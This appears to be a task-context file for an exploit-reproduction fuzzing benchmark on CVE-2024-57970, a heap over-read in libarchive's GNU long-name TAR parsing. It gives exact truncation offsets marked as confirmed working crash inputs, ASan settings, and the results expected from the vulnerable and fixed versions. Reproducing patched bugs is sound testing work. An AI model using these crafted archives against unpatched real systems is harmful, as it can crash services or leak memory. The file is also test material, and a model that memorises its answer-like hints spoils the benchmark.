# CVE-2024-57970: Complete Technical Context

## Official Advisory Summary

**CVE ID:** CVE-2024-57970  
**Type:** Heap-based buffer over-read (CWE-126)  
**Component:** libarchive TAR reader  
**Function:** `header_gnu_longlink` in `libarchive/archive_read_support_format_tar.c`  
**Trigger:** Truncation in GNU long linkname during TAR parsing

**References:**
- NVD: CVE-2024-57970
- Upstream Issue: libarchive #2415 (ASan report)
- Upstream Fix: PR #2422 (merged Dec 10, 2024)
- Fixed Release: libarchive 3.7.8

## Technical Deep Dive

### GNU Long Linkname Format

TAR standard headers support 100-byte names. GNU extension for longer names:
```
[Header Block: type='K'/'L', size=N]
[Data Block(s): N bytes of linkname, null-terminated]
[Padding to 512-byte boundary]
```

**Type flags:**
- `K` = GNU long linkname
- `L` = GNU long pathname

### Vulnerability Mechanics

**Code flow in `header_gnu_longlink`:**
1. Read special header indicating long linkname
2. Extract declared size N from header
3. Allocate buffer for N bytes
4. Read N bytes from archive
5. **BUG:** If archive truncates before N bytes available:
   - Buffer contains < N bytes
   - Code calls `strlen()` assuming complete null-terminated string
   - `strlen()` reads past buffer end  heap over-read

### Precise Mutation Strategies

**CRITICAL: Start with valid TAR containing GNU long linkname**

**Base seed requirements:**
```
Size: 10,240 bytes (20 × 512-byte blocks)
Format: GNU TAR with deterministic metadata (mtime=0, uid=0, gid=0)

Offset 0-511:    LongLink header: type='L', size=160 (octal 0000240), name="././@LongLink"
Offset 512-1023: Linkname data (160 bytes: 159 'a' chars + null terminator)
Offset 1024-1535: Regular file header referencing the long name
Offset 1536-10239: File content (4KB of "BASESEED\n" pattern)
Offset 10240+:   Two 512-byte zero blocks (TAR end markers)

Total: 10,240 bytes valid TAR
IMPORTANT: Base seed must NOT crash either version
Provided: tasks/CVE-2024-57970_libarchive/seeds/base.tar
```

**Type flags clarification:**
- `L` = GNU long filename (used in base seed)
- `K` = GNU long linkname  
- Both trigger `header_gnu_longlink()` function
- Fuzzing mutates the base seed (type 'L') to create exploits

**Mutation targets to trigger heap over-read:**

**CRITICAL: Start with valid 10,240-byte base.tar (NOT pre-truncated!)**

1. **Truncate at block boundaries:**
   - `{"op": "truncate", "new_len": 768}` → Mid-linkname data (after header + 256 bytes)
   - `{"op": "truncate", "new_len": 1024}` → At second block boundary

2. **Truncate just before/at declared size:**
   - Declared size: 160 bytes at offset 512-671
   - `{"op": "truncate", "new_len": 671}` → Just before end
   - `{"op": "truncate", "new_len": 640}` → Mid-linkname

3. **Overwrite size field then truncate:**
   - Original size: "0000240" (octal) = 160 bytes
   - Increase to "0001000" (octal) = 512 bytes  
   - Then truncate at 768 → strlen() reads past buffer

**Effective mutation sequence:**
```json
{
  "mutations": [
    {"op": "truncate", "new_len": 768}
  ]
}
```

**High-value truncation offsets (from 10,240-byte base):**
1. **Block boundary:** `512 + 256` = 768 bytes ⭐ (Known to work)
2. **Base_truncated size:** 3,072 bytes ⭐ (Validated exploit)
3. **Final_base size:** 1,471 bytes ⭐ (Official PoC size)
4. **Mid-linkname:** `512 + 80` = 592 bytes
5. **Just before terminator:** `512 + 159` = 671 bytes
6. **Early truncation:** `512 + 50` = 562 bytes
7. **Exact declared size:** `512 + 160` = 672 bytes (edge case)

⭐ = Confirmed working exploit size

### Benchmark Environment
- Base: Ubuntu 22.04
- Compiler: Clang with `-fsanitize=address,undefined`
- Command: `bsdtar -tf /input/seed.bin`
- Timeout: 10 seconds

### Expected Outcomes
**Vulnerable (3.7.7):** 
- Exit code: **139** (SIGSEGV)
- stderr contains: `AddressSanitizer: heap-buffer-overflow` OR `Segmentation fault`

**Fixed (3.7.8):** 
- Exit code: **0** or **1** (parsing error handled gracefully)
- stderr: `Truncated archive detected` or clean output
- NO ASan output

**CRITICAL ASan Configuration:**
The vulnerability is a heap-buffer-**READ** (not write), which requires strict ASan options:
- Compilation: `-fsanitize=address -fsanitize-address-use-after-scope`
- Runtime: `ASAN_OPTIONS="strict_string_checks=1:halt_on_error=1:abort_on_error=1"`

Without `strict_string_checks=1`, the over-read may not cause a crash.

### Known Working Exploits

Two validated exploits are available for reference:

**1. final_base.tar (1,471 bytes) - Official PoC**
- Source: GitHub issue #2415 (heap_of.tar)
- Structure: GNU TAR with type 'K' longlink, truncated mid-linkname
- Vulnerable result: exit_code=139 (SIGSEGV)
- Fixed result: exit_code=1 (truncation detected)
- Location: `tasks/CVE-2024-57970_libarchive/seeds/final_base.tar`

**2. base_truncated.tar (3,072 bytes) - Truncated Valid TAR**
- Source: Valid GNU TAR truncated at 3072 bytes (6 blocks)
- Structure: Truncation cuts off mid-linkname data
- Vulnerable result: exit_code=139 (SIGSEGV)
- Fixed result: exit_code=0 (clean handling)
- Location: `tasks/CVE-2024-57970_libarchive/seeds/base_truncated.tar`

**Key insight from working exploits:**
- Both are **significantly smaller** than the 10,240-byte base seed
- Truncation is at **specific boundaries** that cause strlen() to read beyond allocation
- The exact truncation point matters - not all truncations crash
- Exploit sizes: 1,471 bytes and 3,072 bytes (vs. 10,240-byte base)

### Iterative Fuzzing Guidance

**Starting point:** Use `base.tar` (10,240 bytes) - valid non-crashing seed

**Proven Strategy (based on successful exploits):**
1. **Simple truncation ALONE is sufficient** - DO NOT add other mutations
2. **Target sizes that work:** 768 bytes ⭐, 1,471 bytes ⭐, or 3,072 bytes ⭐
3. **Block boundaries are effective** - multiples of 512 often trigger the bug
4. **Smaller is better** - successful exploits are much smaller than base seed

**CRITICAL: Mutation Order Rules**
⚠️ **Mutations are applied SEQUENTIALLY in the order you specify**
- ✅ CORRECT: `[{"op": "truncate", "new_len": 768}]` - Simple truncate only
- ✅ CORRECT: `[{"op": "truncate", "new_len": 768}, {"op": "overwrite_range", "offset": 256, "hex": "00"}]` - Truncate FIRST, then overwrite
- ❌ WRONG: `[{"op": "overwrite_range", "offset": 1024, "hex": "00"}, {"op": "truncate", "new_len": 768}]` - Overwrite at 1024 fails because file only has 768 bytes after truncate happens earlier
- ❌ WRONG: Adding unnecessary overwrites/repeats that damage the TAR structure

**Best Practice: Use ONLY truncate mutation for this CVE**
```json
{"mutations": [{"op": "truncate", "new_len": 768}]}
```
Do NOT add overwrite_range, flip_bit, or repeat_range operations - they damage the TAR structure and prevent the crash.

**Phase 1 (iter 1-3):** Test known working sizes
```json
{"mutations": [{"op": "truncate", "new_len": 768}]}   // ⭐ Confirmed working
{"mutations": [{"op": "truncate", "new_len": 1471}]}  // ⭐ Official PoC size
{"mutations": [{"op": "truncate", "new_len": 3072}]}  // ⭐ Known working size
```

**Phase 2 (iter 4-7):** Explore block boundaries if Phase 1 didn't work
```json
{"mutations": [{"op": "truncate", "new_len": 512}]}
{"mutations": [{"op": "truncate", "new_len": 1024}]}
{"mutations": [{"op": "truncate", "new_len": 1536}]}
{"mutations": [{"op": "truncate", "new_len": 2048}]}
```

**Phase 3 (iter 8-10):** Fine-tune around successful sizes
- If 768 works: Try 700, 750, 800
- If 3072 works: Try 3000, 3100, 3200
- Test edge cases near declared size boundaries

**Validation checklist per iteration:**
- ✅ Seed starts with valid TAR header (magic "ustar\0" at offset 257)
- ✅ Truncation is shorter than original 10,240 bytes
- ✅ Focus on sizes < 5,000 bytes (successful exploits are small)
- ⚠️ Use ONLY truncate - no other mutations needed!

**Success criteria:**
- Vulnerable (3.7.7): Exit code 139 (SIGSEGV), stderr contains "AddressSanitizer: heap-buffer-overflow"
- Fixed (3.7.8): Exit code 0 or 1 (parsing error), NO ASan output

**File format note:**
- Seed can be .bin or .tar (bsdtar accepts both)
- Pipeline automatically detects TAR format from header magic
- Use base.tar from seeds/ directory as starting point
